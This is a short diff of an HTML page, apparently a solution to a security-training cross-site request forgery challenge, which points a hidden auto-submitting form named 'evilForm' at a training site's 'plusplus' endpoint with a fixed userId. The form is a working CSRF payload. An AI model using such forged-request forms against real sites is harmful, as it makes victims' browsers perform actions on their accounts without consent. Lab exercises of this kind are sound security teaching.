@@ -7,7 +7,7 @@
 <P> This is a new paragraph!
 <P> <B>This is a new paragraph!</B>
 <BR> <B><I>This is a new sentence without a paragraph break, in bold italics.</I></B>
-<form name="evilForm" action="https://192.168.1.5/user/csrfchallengetwo/plusplus" method="POST">
+<form name="evilForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
     <input type="hidden" name="userId" value="904afef8bec97589f74a4897adc7579888eca47e" />
     <input type="submit"/>
 </form>
